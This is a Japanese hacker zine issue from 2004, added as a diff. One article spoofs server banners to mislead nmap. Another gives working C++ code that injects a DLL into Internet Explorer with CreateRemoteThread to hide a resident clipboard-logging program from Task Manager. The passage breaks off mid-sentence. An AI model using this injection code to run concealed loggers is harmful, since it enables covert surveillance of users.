@@ -1,0 +1,1231 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.10 (2004,5,21)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第０章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第１章：フィンガープリント偽装                          J-Klein 著
+
+○第２章：常駐プログラム隠蔽テクニック　～Windows篇～  Kenji Aiko 著
+
+○第３章：ブルースクリーンと仲良くなろうよ               IPUSIRON 著
+
+○第４章：今、欲しいハードウエア                              MaD 著
+
+○第５章：お知らせ
+
+○第６章：著者プロフィール
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第１章: フィンガープリント偽装 ---
+
+著者：J-Klein
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　いきなりだが『偽装』と聞いてどんな印象をうけるだろうか？  「◯◯を偽装
+した」などと言われると、いかにも悪いイメージがあるのではないだろうか。例
+えば、『偽装』に関連した行為・技術といえば、次が挙げられます。
+
+・ファイルの偽装
+・IPアドレスの偽装
+・メールアドレスの偽装
+・URLの偽装
+
+　他にもいろいろあって、Googleで『偽装』で検索すると『日本◯ム牛肉偽装事
+件』なんてものも見つかる。どう見たって、『偽装』は黒い技術としか思えない。
+しかし、これを防御の側から利用できないだろうか。つまり、クラッカーから攻
+撃されない（もしくは適切な攻撃をされない）ようにシステムを偽装すれば良い
+のだ。
+
+　では、システムを守るために何をどう偽装すれば良いのか？ いろいろな偽装が
+考えられるが、ここではサーバとして動作するソフトウェア（以下ことわりが無
+い限り、ソフトウェア＝サーバとして動作するソフトウェアとする）を偽装する
+ことだけを考えてみたいと思う。他の防御の為の偽装のアイディアは最後に触れ
+る程度にしておく。
+
+
+■0x02.) なぜ、ソフトウェアを偽装するのか
+
+　なぜ、ソフトウェアを偽装するのか。これはクラッカーが攻撃の際に何をする
+かを考えれば分かるはずだ。特に攻撃自体を自動化している場合、ソフトウェア
+の偽装はかなりの威力を発揮する。例えば、一昔前に流行した（？）IISのUnico
+deバグを自動で攻撃する場合、次のような自動化プログラムが使用されると思わ
+れる。
+
+(1) ランダムな（または任意の範囲の）IPアドレスに対して80番ポートが開いて
+いるかを調べる。
+(2) 開いている場合、Webサーバである可能性が極めて高い。そこでHEADメソッド
+などでServerヘッダなどを見てどのソフトウェアのどのバージョンが動いている
+かを調べる。
+(3) IISの脆弱なバージョンならば攻撃する。
+
+　このプロセスのうち（2）を適切に行なわれないようにすれば良い。この例で言
+えば、IIS/4.0だと思われなければ良いのだ。しかし、（2）を省いて世界中の80
+ポートに総当たり的に攻撃を仕掛けられると偽装うんぬんの意味は無い。事実、
+私の管理下にある純粋なApacheのログにも対IISの攻撃の記録が少しだが残ってい
+る。しかし、ここではそのような攻撃ではなく、上記リストの（2）を行なうよう
+な攻撃に対する防御のみを考える。
+
+　で、結局は何に偽装すれば良いのか？  結論から言えば何でも良いはずだ。攻
+撃方法というのはソフトウェア毎にあって、ソフトウェアAに対して有効な攻撃も
+ソフトウェアBに対しては効かない事が多い。極端な話、存在しない名前でも良い
+（むしろ、存在し無い方が良いかも知れない）。
+
+　あらかじめ書いておくが、この偽装による防御は予備的な防御手段であること
+を忘れないで欲しい。どんなときでも適切なソフトウェアの適切なバージョンを
+使うのが一番であり、それをした上でこのような予備的な防御をするのである。
+
+
+■0x03.) Apache-2.0.x系の偽装
+
+　では、実際にApacheの偽装をしてみる。
+　偽装のポイントは『エラーページでのシステム情報の表示』と『Serverヘッダ』
+の二つだ。まずは、簡単で面白くない『エラーページのシステム表示』を偽装し
+てみる。
+
+　まず、あなたが管理するApacheサーバに対して存在しないURLを要求して欲しい。
+手元の環境では次のような文字が表示される。
+
+-----
+Object not found!
+The requested URL was bar bar bar...
+
+Error 404
+linux
+Mon May 10 20:18 2004
+Apache/2.0.40
+-----
+
+　見れば分かる通り、OSの種類から詳細なバージョンまで表示されている。ここ
+でいう『システム情報』とはこれらのことを指している。なぜデフォルトでこの
+ような情報を表示するかはまったく分からない。一般のユーザは『ファイルが存
+在しないこと』を知りたいのであり、けっしてOSやソフトウェアのバージョンに
+興味が無いはずなのに…。とにかく、これを改善しよう。教科書通りのやり方は
+httpd.conf内のServerTokensの値を変える方法だ。
+
+　ServerTokensは公開するシステム情報の量を調整するディレクティブであり、
+後述するServerヘッダもこのServerTokensに従う。
+
+-----
+ServerTokens {ProductOnly | Minimal | OS | Full}
+-----
+
+　括弧内に含まれる値を入れればそれ相応の内容になる。出力内容は想像できる
+はず。しかし、これでは偽装にならないので、別のやり方で対応することにする。
+ServerTokensの値は適当に設定して（使用しないので何でも良い）、
+<DocumentRoot>/error/include/にあるbottom.htmlを見て欲しい。これはエラー
+ページの末尾に読み込まれるファイルだ。詳しい説明は省くが、実験として
+"SERVER_SOFTWARE"を含む行を削除して、別の文字を書いて保存してほしい。そし
+て、もう一度存在しないURLにアクセスすれば表示が変るはずだ。
+
+　次に、Serverヘッダを偽造してみる。実はここで挑戦する方法はApache1.3系で
+は出来なかった。詳細は省くが、おそらくモジュールの実行順序に依存していて、
+できるものとできないものがあるのだろう。ここではApache2.0.40で試している。
+まず、多少いんちきになってしまうが、httpd.confのServerTokensディレクティ
+ブの値をFullにしてほしい。そうしないとnmapがapache2.0.40を認識してくれな
+い。
+
+　この記事を通して、nmapのバージョンは3.50とする。
+
+　ここで、nmapでWebサーバのバージョンスキャン（-sVオプション）を行なう。
+
+-----
+[work] jklein% nmap -sV localhost -p 80
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.0.40 ((Red Hat Linux) DAV/2)
+...
+-----
+
+　このような出力になるはずだ。つまり外部からバージョン情報・OS等が認識で
+きることになる。ところが、nmapの対WebサーバのバージョンスキャンはServerヘ
+ッダのみを利用しているようなので、そこを変えればがらっと偽装できる。httpd
+.confにつぎのような行を入れてみて欲しい。
+
+-----
+Header Set Server 'Microsoft-IIS/4.0'
+-----
+
+　まったくの逆行した偽装なのだが、これが分かりやすい結果になるので試して
+欲しい。上記のように設定を変えて、Apacheを再起動して、最初と同様にnmapを
+実行してみると…
+
+-----
+[work] jklein% nmap -sV localhost -p 80
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS webserver 4.0
+...
+-----
+
+　どうだろうか、本物のIIS/4.0との違いはまったくない。nmapのOSスキャン
+（-Oオプション）と同時に使うとLinux上でIISが動作しているように表示される
+はずだ。ちなみにこの状態でしばらく放置しておくと、普段よりも多くの"XXXXX
+XXXXXXXX..."というログを見かけるようになる。さすがに最近は少くなったと思
+われるが…。
+
+　もちろん、実際に動作しているソフトウェアはApacheなので、基本的にIISに対
+する攻撃は効かない。
+
+
+■0x04.) ProFTPDの偽装
+
+　ProFTPDとは名前の通りFTPサーバで、使われてるサーバも多い。これの偽装に
+挑戦したのだが、実はApacheのように設定ファイル云々ではうまくいかない。と
+いうのもProFTPDという文字がプログラムのソースコード自体に直接書きこまれて
+いるのでプログラムを書き変える必要が有る。よって、C言語の知識が無い人は挑
+戦しない方が良いだろう。今流行の自己責任で試して欲しい。
+
+　変更すべき場所はsrc/main.cの中のcmd_loop関数だ。この中にあるProFTPDとい
+う文字列を片っ端から書き変えれば良い（手元のバージョンでは二箇所ある）。
+例えば、次のような行があるので、それを変更すれば良い
+
+-----  変更前
+pr_response_send(R_220, "ProFTPD " PROFTPD_VERSION_TEXT
+                "Server ready.");
+-----
+
+-----  変更後
+pr_response_send(R_220, "host FTP server (lukemftpd 1.1) ready.");
+-----
+
+　これはMacOSXにデフォルトでついているFTPサーバをまねたものだ。このような
+変更をした後でnmap -sVを実行すると次のようになる。
+
+-----
+[network] jklein% nmap localhost -sV -p 21
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     LukemFTPD 1.1 (Mac OS X uses lukemftpd derivative)
+...
+-----
+
+　この結果を見て、思わず「してやったり」とニヤついてしまった。ご丁寧にOS
+まで教えてくれる。nmapの強力さと無力さを同時に見た気分だ。
+
+
+■0x05.) Telnetの偽装
+
+　結論から言うと、Telnetに対するnmapのバージョンスキャンを騙すことは出来
+なかった。一応、RedHat Linux上のtelnetでのログインメッセージを変える方法
+を紹介するだけにしたいと思う。
+
+　ログインメッセージは/etc/issue.netから読み込まれるので、その内容をエデ
+ィタで編集すれば良い。私の環境でデフォルトの状態で
+
+-----
+Red Hat Linux release 9 (Shrike)
+Kernel \r on an \m
+-----
+
+となっていた。"\r"や"\m"のようなバックスラッシュ（又は￥マーク）+１文字は
+エスケープ文字で、実際の表示の際には別の文字に置き換わる。利用できるエス
+ケープ文字は
+
+=====　表
+\d : 現在の日付
+\l : 端末名
+\m : マシン・アーキテクチャ
+\n : ホスト名
+\o : ドメイン名
+\r : OSのリリース番号
+\t : 現在の時刻
+\s : OS名
+\u : 現在ログインしているユーザの数
+\v : OSのバージョン
+=====
+
+となっている。ただし、『偽装』という観点からはこれらの情報を使わない方が
+いいだろう（まぁ、そこまで偽装にこだわる必要もないが）。このメッセージを
+好きに変えれば良い。最初に書いた通り、このメッセージを変えてもnmapは騙せ
+ない。が、デフォルトの状態で情報たれ流しというのも良くないので、適当に変
+えておこう。
+
+　Red Hat系のOSでは起動時に/etc/issueが/etc/issue.netにコピーされてしまう。
+これでは起動するたびに初期化されてしまうので、コピーを防止するために
+/etc/rc.d/rc.localのコピーを実行する部分をコメントアウトしなくてはいけない。
+
+
+■0x06.) まとめ
+
+　今回はApacheとProFTPD（とTelnet）のnmapによるバージョンスキャン対策をし
+てみたが、正直ProFTPDのようにソース書き変えを必要とするものはつらい。とい
+うのも１回や２回ならば良いのだが、バージョンアップで再インストールするた
+びにソースを書き変えるのは管理者にとってかなり負担になりうる。しかも、ソ
+ースを書き変える以上、バグを作らないとも限らない。これからサーバ系のソフ
+トウェアを作る人は是非とも簡単にラベルを変更出来るようにして欲しいと思う。
+
+　他に簡単に出来る偽装（とは普通言わないが…）としてはポート番号の変更が
+ある。これも想像以上に効果があると思う。特に公開サーバでないのならば、気
+楽に変更出来るはずだ。そして、大抵のソフトウェアはポートの変更が簡単に出
+来る。
+
+　ローカル内での技としてはrootの名称変更、重要なファイルの名称変更なども
+考えられる。慎重なクラッカーはその手の変更を見破るかもしれないが、少くと
+も瞬時に破られることも無いだろう。
+
+　結局、このような偽装は自分の見を守るだけではない。というのも、多くの管
+理者がこのようなことを行なうことでnmap等のソフトウェア/バージョンスキャン
+の信頼性を下げることが出来るからだ。そうなると、クラッカーにはツールに頼
+らない総合的な知識が必要になり、スクリプト・キディのような輩の力を押し下
+げることが可能になる。
+
+　と、期待するものの、最後にはいたちごっこになってしまうんだろうな（苦笑）。
+
+
+■0x07.) 参考サイト
+
+(1) Remote OS detection via TCP/IP Stack FingerPrinting
+    http://www.insecure.org/nmap/nmap-fingerprinting-article-jp.html
+(2) core - Apache HTTPサーバ
+    http://httpd.apache.org/docs-2.1/ja/mod/core.html
+(3) Apache module mod_headers
+    http://httpd.apache.org/docs/mod/mod_headers.html
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第２章：常駐プログラム隠蔽テクニック　～Windows篇～ ---
+
+著者：Kenji Aiko
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　タスクマネージャーに任意のプログラムを列挙されないようにする方法はない
+だろうか？　Windowsにはプロセスという概念がありアプリケーションはそれぞれ
+プロセス単位で動作しています。プロセスは「Ctr+Alt+Del」で起動されるタスク
+マネージャーで確認でき、これを見ると現時点で起動しているプロセスのすべて
+を監視することができます。
+
+　さて、Windows上で実行されているアプリケーションはすべてＯＳの管理下に置
+かれているわけであり、よってすべてのプロセスをＯＳは管理していることにな
+ります。つまりは「常駐させたいプログラムをタスクマネージャーから消し去る
+ことは難しいのでは？」と思われるかもしれません。ということで、今回は常駐
+プログラム隠蔽テクニックと題してお送りしたいと思います。
+
+　私が使用したＯＳはWindowsXP、コンパイラはVC++.NETです。前提となる知識は、
+Win32API、ＤＬＬの仕組み、それにプロセスやスレッドといったWindowsの基本的
+概念を理解していることです。
+
+
+■0x02.) プロセスとＤＬＬ
+
+　では最初に、タスクマネージャーに実行したプログラムがプロセスとして列挙
+されるところを観察してみます。test.cppをコンパイルし、タスクマネージャー
+を起動した後、以下のプログラムを実行してみてください。
+
+-----　test.cpp
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <tchar.h>
+
+int APIENTRY WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPTSTR    lpCmdLine,
+                     int       nCmdShow)
+{
+    MessageBox(NULL, _TEXT("I am EXE file."), _TEXT("message"), MB_OK);
+    return 0;
+}
+-----
+
+　このプログラムが実行された直後にタスクマネージャーにtest.exeというプロ
+セスが出現します。このプログラムはご覧のとおりＯＫボタンを押すと終了する
+ので、押さないままでいると、ずっとタスクマネージャーにプロセスとして存在
+することになります。もちろんＯＫボタンを押すとプログラムは終了しますので、
+プロセスもタスクマネージャーから消えます。
+
+　さて、アプリケーションはプロセス単位で管理されていてプログラムが実行さ
+れればプロセスとしてタスクマネージャーに列挙されるということになります。
+「ではＤＬＬの扱いはどうなるのか？」次のプログラムをみてください。
+
+-----　dlltest.cpp
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <tchar.h>
+
+DWORD WINAPI MainThread(LPVOID pData);
+
+BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+                     )
+{
+    HANDLE hThread;
+
+    switch(ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        
+        if((hThread = CreateThread(NULL, 0, MainThread, (LPVOID)NULL, 0, NULL)) == NULL){
+            MessageBox(NULL, _TEXT("CreateThread"), _TEXT("Error"), MB_OK);
+            return FALSE;
+        }
+        CloseHandle(hThread);
+        break;
+    }
+
+    return TRUE;
+}
+
+
+
+DWORD WINAPI MainThread(LPVOID pData)
+{
+    MessageBox(NULL, _TEXT("I am DLL file."), _TEXT("message"), MB_OK);
+    return 0;
+}
+-----
+
+　まずはこのようなＤＬＬを作成します。このＤＬＬは呼び出されたら新しいス
+レッドを生成し、そのスレッドはMessageBoxを表示して、終了するというシンプ
+ルなものです。では次にこのＤＬＬを明示的に呼び出すtest2.cppを作成します。
+
+-----　test2.cpp
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <tchar.h>
+
+int APIENTRY WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPTSTR    lpCmdLine,
+                     int       nCmdShow)
+{
+    MessageBox(NULL, _TEXT("I am EXE file."), _TEXT("message"), MB_OK);
+    
+    HINSTANCE hinstDll = LoadLibrary("dlltest");
+    Sleep(10000);
+    FreeLibrary(hinstDll);
+    return 0;
+}
+-----
+
+　では、このプログラムをコンパイルしてexeファイルの生成を確認したら、
+dlltest.cppをコンパイルして作成されたdlltest.dllを、exeファイルと同じフォ
+ルダに移動させて実行させてください。もちろんタスクマネージャーも起動させ
+てください。
+
+　最初の"I am EXE file."が表示されたときにはＤＬＬはまだ読み込まれていま
+せん。タスクマネージャーにはtest2.exeが列挙されています。ＯＫをクリックす
+ると次はＤＬＬが読み込まれて"I am DLL file."が表示されます。ここでＯＫを
+押さずに、タスクマネージャーを見てみても、プロセスの列挙に変化はありませ
+ん。つまり新たにプロセスが生成されたわけではないということです。
+
+　これはＤＬＬの仕組みを理解しているならば当たり前のことですね。ＤＬＬは
+LoadLibraryを呼び出された時点で、呼び出し元のスレッドのプロセスにマッピン
+グされるわけですから。つまりＤＬＬはプロセスにマッピングされた直後からそ
+のプロセスの一部となるわけであり、そこで新たにCreateThreadが呼び出された
+としても、test2.exeのプロセス内で新たにスレッドが生成されただけだからです。
+よって、test2.exeが終了すればそのプロセスにマッピングされているＤＬＬ
+（dlltest.dll）もまた終了するのは当たり前であり、ＤＬＬがプロセスとして新
+たにタスクマネージャーに列挙されないのも当たり前のことです。
+
+
+■0x03.) 別のプロセスへのＤＬＬマッピング
+
+　ポイントは誰がLoadLibraryを呼んだのか？　というところにあります。ＤＬＬ
+はLoadLibraryを呼び出したスレッドのプロセスにマッピングされるわけです。d
+lltest.dllの場合、LoadLibraryを呼び出したのはtest2.exeだったのでdlltest.
+dllはtest2.exeにマッピングされました。なのでそのプロセス（test2.exe）が終
+了したならばＤＬＬ（dlltest.dll）もまた終了するわけです。
+
+　では例えばLoadLibraryをIEXPLORE.EXE（ＩＥのプロセスです）が呼び出したら
+どうでしょうか。IEXPLORE.EXEが引数をdlltest.dllとしてLoadLibraryを呼び出
+したならば、もちろんdlltest.dllはIEXPLORE.EXEにマッピングされることになり
+ます。つまりtest2.exeが終了したとしてもＤＬＬは終了しません（当たり前です
+ね）。IEXPLORE.EXEにマッピングされたわけですので、IEXPLORE.EXEが終了する
+までは終了しないわけです。しかし「そもそもIEXPLORE.EXEに、LoadLibraryを呼
+び出させることはできないじゃないか。ＤＬＬを呼び出すかどうかはexeファイル
+（IEXPLORE.EXE）の作成者が決めることであって、他人が決められることじゃな
+いのでは？」と思われるかもしれませんが、それが可能なのです。Windowsには便
+利なAPIがたくさんあるのです(^^;。
+
+・CreateRemoteThread
+　http://www.microsoft.com/japan/developer/library/jpwinpf/_win32_createremotethread.htm
+
+　別のプロセスのアドレス空間で稼働するスレッドを作成します。
+
+　説明のとおり別のプロセスのアドレス空間にスレッドを作成します。これを使
+えばIEXPLORE.EXEのアドレス空間にスレッドを作成できるわけです。例えばこん
+な風に。
+
+-----
+HANDLE hThread = CreateRemoteThread(RemoteProcess, NULL, 0,
+                                    LoadLibrary, "c:\\dlltest.dll", 0, NULL);
+-----
+
+　「めっちゃ簡単やーん」と思ってやってみると、できません（笑　おそらく問
+題は「IEXPLORE.EXEのアドレス空間に"c:\\dlltest.dll"という文字列がない」と
+いうことでしょう。まぁ、ないならば作ればよいわけです。
+
+・VirtualAllocEx
+　http://www.microsoft.com/japan/developer/library/jpwinpf/_win32_virtualallocex.htm
+　指定されたプロセスの仮想アドレス空間内のメモリ領域の予約とコミットの一
+方または両方を行います。この関数は MEM_RESET フラグがセットされていない限
+り、確保されるメモリが自動的に 0 で初期化されます。
+
+・WriteProcessMemory
+　http://www.microsoft.com/japan/developer/library/jpwinpf/_win32_writeprocessmemory.htm
+　指定されたプロセスのメモリ領域にデータを書き込みます。書き込みたい領域
+全体がアクセス可能でなければなりません。さもないと、関数は失敗します。
+
+　VirtualAllocExでIEXPLORE.EXEのアドレス空間に新たにメモリ空間を作成しま
+す。そしてWriteProcessMemoryでそのメモリ空間に"c:\\dlltest.dll"を書き込め
+ばよいわけです。そしてその文字列のアドレスをCreateRemoteThreadの第五引数
+に渡してやれば、IEXPLORE.EXEのアドレス空間内に文字列が作成されることにな
+ります。しかし、まだできません（ぉぃ。どうやら第四引数のLoadLibraryをその
+まま渡すのはまずいらしいです。仕方がないのでKernel32.dllから検索してきて
+そのアドレスを渡してあげましょう。
+
+・GetModuleHandle（日本語版ＳＤＫがないみたいです）
+　http://nienie.com/~masapico/api_GetModuleHandle.html
+　現在呼び出し元プロセスにロードされているexeやdllのメモリ上の位置を示す
+アドレスを返す。従って、GetModuleHandleの返すハンドルはLoadLibrary関数で
+返されたハンドルと同様の扱いで、他のAPI関数に渡すことができる。
+
+・GetProcAddress
+　http://www.microsoft.com/japan/msdn/library/default.asp?url=/japan/msdn/library/ja/jpdllpro/html/_win32_getprocaddress.asp
+　ダイナミックリンクライブラリ（DLL）が持つ、指定されたエクスポート済み関
+数のアドレスを取得します。
+
+　GetModuleHandleでKernel32.dllのアドレスをもらい、それをGetProcAddressに
+渡してLoadLibraryのアドレスを取得します。しかし、実はLoadLibraryなんて関
+数は存在せず、UNICODEならLoadLibraryW、ASCIIコードならLoadLibraryAに変換
+されているだけであることが、WinBase.hをみることでわかります。よってどちら
+かのアドレスを取得することにします。
+
+-----　C:\Program Files\Microsoft Visual Studio .NET\Vc7\PlatformSDK\Include\WinBase.h
+#ifdef UNICODE
+#define LoadLibrary  LoadLibraryW
+#else
+#define LoadLibrary  LoadLibraryA
+#endif // !UNICODE
+-----
+
+　さて、これらの知識を踏まえた上でやるべきことをまとめます。目的は別のプ
+ロセス（ここではIEXPLORE.EXE）にＤＬＬを注入させることです。そのために必
+要なことはターゲットのプロセス（ここではIEXPLORE.EXE）にLoadLibraryを呼び
+出させることであり、それによってこちら側が用意したＤＬＬをターゲットのプ
+ロセスにマッピングさせることです。それにより常駐させるプログラムをあらか
+じめＤＬＬとして作っておけば、それをターゲットプロセスにマッピングさせる
+ことによりタスクマネージャーのプロセス空間に列挙されることなく任意のプロ
+グラム（ＤＬＬ）を注入させ、実行させようということです。
+
+
+■0x04.) プログラミング
+
+　以上のことをプログラムにしたのがin_dll.cppです。まずはプログラムの説明
+をします。
+
+http://kenjinet.s26.xrea.com/windows/process/in_dll.cpp
+
+-----
+#define WIN32_LEAN_AND_MEAN
+
+#define UNICODE
+#define _UNICODE
+
+#include <windows.h>
+#include <tlhelp32.h>
+#include <tchar.h>
+
+#define TARGET_EXE_NAME  "IEXPLORE.EXE"
+#define DLL_FILE_NAME    "ClipBoard.dll"
+-----
+
+　「なんでUNICODEやねん！」という突っ込み以外はとくに問題ないと思います(^^;
+　tlhelp32.hはプロセスの検索を行うために使う関数の定義なのですが、詳しく
+はのちほど説明します。TARGET_EXE_NAMEはＤＬＬを注入するプロセスの名前、
+DLL_FILE_NAMEは注入するＤＬＬのファイル名です。ＤＬＬはexeファイルと同じ
+フォルダにいれなければなりません。
+
+-----
+    HANDLE hSnap;
+    if((hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE){
+        MessageBox(NULL, _TEXT("CreateToolhelp32Snapshot"), _TEXT("Error"), MB_OK);
+        return -1;
+    }
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+
+    DWORD dwProcessId = 0;
+    BOOL bResult = Process32First(hSnap, &pe);
+    while(bResult){
+        if(!lstrcmp(pe.szExeFile, _TEXT(TARGET_EXE_NAME))){
+            dwProcessId = pe.th32ProcessID;
+            break;
+        }
+        bResult = Process32Next(hSnap, &pe);
+    }
+    CloseHandle(hSnap);
+-----
+
+　さっそくプロセスの検索を行います。CreateToolhelp32Snapshotはプロセスの
+列挙をおこなうタスクマネージャー的なプログラムを作る際に利用されるプログ
+ラムで、たいていの場合Process32FirstやProcess32Nextとセットにして使い、
+PROCESSENTRY32構造体のpeにプロセスの情報が入ります。プロセス列挙に関する
+サンプル的なコードを書きましたので、よければ参考にしてください。
+
+http://kenjinet.s26.xrea.com/windows/process/process.cpp
+
+　ではin_dll.cppの説明を続けます。
+
+-----
+    HANDLE hProcess;
+    hProcess = OpenProcess(
+         PROCESS_QUERY_INFORMATION |
+         PROCESS_CREATE_THREAD     |
+         PROCESS_VM_OPERATION      |
+         PROCESS_VM_WRITE,
+         FALSE, dwProcessId);
+-----
+
+　これはプロセスを開く関数です（みればわかりますが）。プロセスＩＤを渡せ
+ばそのプロセスを開いてくれるので、さっきProcess32Nextなどを使って検索して
+きたTARGET_EXE_NAMEのプロセスＩＤ（つまりＤＬＬを注入するターゲットのプロ
+セスＩＤ）を渡しています。戻り値はそのプロセスのハンドルです。
+
+-----
+    TCHAR szLibFile[256];
+    GetModuleFileName(NULL, szLibFile, sizeof(szLibFile));
+    _tcscpy(_tcsrchr(szLibFile, _TEXT('\\')) + 1, _TEXT(DLL_FILE_NAME));
+-----
+
+　ＤＬＬのパスを作成しています。まずGetModuleFileNameで自分自身（つまり
+exeファイル）の絶対パスを取得して、その文字列の後ろから探して最初に'\'が
+発見されたところから以後ＤＬＬファイルの名前に置き換えています。つまり自
+分と同じフォルダにあるＤＬＬの絶対パスを作成したわけです。
+
+-----
+    PWSTR RemoteProcessMemory;
+    RemoteProcessMemory = (PWSTR)VirtualAllocEx(
+        hProcess, NULL, szLibFileLen, MEM_COMMIT, PAGE_READWRITE);
+    if(RemoteProcessMemory == NULL){
+        MessageBox(NULL, _TEXT("VirtualAllocEx"), _TEXT("ERROR"), MB_OK);
+        return -1;
+    }
+
+    if(WriteProcessMemory(hProcess, RemoteProcessMemory,
+        (PVOID)szLibFile, szLibFileLen, NULL) == 0){
+            MessageBox(NULL, _TEXT("WriteProcessMemory"), _TEXT("ERROR"), MB_OK);
+            return -1;
+    }
+-----
+
+　まずVirtualAllocExでターゲットプロセスにメモリ空間を作成しています。こ
+れはＤＬＬの絶対パスを入れるメモリ空間です。そしてWriteProcessMemoryでＤ
+ＬＬの絶対パスを書き込んでいます。するとVirtualAllocExの戻り値がＤＬＬ絶
+対パスの位置（ポインタ）ということになるので、これをCreateRemoteThreadの
+引数として渡します。
+
+-----
+    PTHREAD_START_ROUTINE pfnThreadRtn;
+    pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(
+        GetModuleHandle(_TEXT("Kernel32")), "LoadLibraryW");
+    if (pfnThreadRtn == NULL){
+        MessageBox(NULL, _TEXT("GetProcAddress"), _TEXT("ERROR"), MB_OK);
+        return -1;
+    }
+-----
+
+　GetProcAddressはKernel32.dllからLoadLibraryW（UNICODE用）を探してきてそ
+のアドレスを返しています。これはUNICODE用のソースコードですのでLoadLibraryW
+ですが、ASCIIならLoadLibraryAを利用してください。Windows2000/XPはLoadLibraryA
+を使っても内部的にUNICODEに変換されて結局LoadLibraryWを呼んでいるようなの
+で、UNICODEかASCIIかで特に気にする必要はないでしょう。
+
+-----
+    HANDLE hThread;
+    hThread = CreateRemoteThread(hProcess, NULL, 0, 
+        pfnThreadRtn, RemoteProcessMemory, 0, NULL);
+    if (hThread == NULL){
+        MessageBox(NULL, _TEXT("CreateRemoteThread"), _TEXT("ERROR"), MB_OK);
+        return -1;
+    }
+-----
+
+　ついにCreateRemoteThreadが呼ばれました。第一引数はOpenProcessの戻り値で
+あるプロセスのハンドルです。第四引数はLoadLibraryWのアドレス。第五引数は
+ＤＬＬ絶対パスのアドレス。これでCreateRemoteThreadを呼び出せばターゲット
+のプロセスでLoadLibraryWスレッドが生成され、見事任意のＤＬＬがターゲット
+プロセスにマッピングされることになります。
+
+　そして、このプログラム（in_dll.exe）は終了します。このプログラムにＤＬ
+Ｌがマッピングされているならば、終了と同時にＤＬＬ自体も終了します。しか
+し別のプロセスにマッピングさせたならば自分自身が終了してもＤＬＬの処理は
+生き続けます。IEXPLORE.EXEならばＩＥが終了するまで生き続けますし、
+explorer.exeといったWindowsの動作に不可欠なプロセスなどにマッピングさせた
+ならばWindowsの終了まで生き続けることになります。
+
+　タスクマネージャーはプロセスを列挙します。よってIEXPLORE.EXEやexplorer
+.exeといったプログラムは、もちろん列挙、表示されるでしょう。しかし、マッ
+ピングされたＤＬＬはプロセスとして列挙されません。これは当たり前のことで
+すね。
+
+　ちなみに、この方法だと完全に隠蔽できるのか？　と聞かれれば「いいえ」と
+答えるしかありません。実際に任意のプロセスが利用しているＤＬＬを列挙させ
+るプログラムなんかも作れますし、タスクマネジャー以上に高機能なプロセス管
+理ツールなどならすぐにバレてしまうかもしれません。あくまでもタスクマネー
+ジャーから見えなくするだけです。よって、これは常駐させたいプログラムを隠
+すひとつの方法だと考えてください。
+
+　では、最後に常駐させたいプログラム（ＤＬＬ）を作成してみます。
+
+http://kenjinet.s26.xrea.com/windows/process/ClipBoard.cpp
+
+　これはクリップボードのログをとるＤＬＬです。キーボードのログをとるのツ
+ールをキーロガーと言いますが、これはクリップボードのログをとるのでクリッ
+プロガーですね（ぉぃ。これをコンパイルしてin_dll.exeと同じフォルダにいれ
+てin_dll.exeを実行すると、このＤＬＬがターゲットのプロセスにマッピングさ
+れるので、以後クリップボードのログが"c:\log.txt"ファイルに保存されること
+になります。ちなみに文字列専用ですのでクリップボード内の画像やファイルな
+どはロギングしません。このＤＬＬに関しての解説はしません。これは今回の本
+質ではないので(^^;。
+
+
+■0x05.) さいごに
+
+　さて、いかがだったでしょうか。ＤＬＬ関連のテクニックは以外に役に立つん
+じゃないかなと思い書いてみました。実はつい最近、実用的なキーロガーを作り
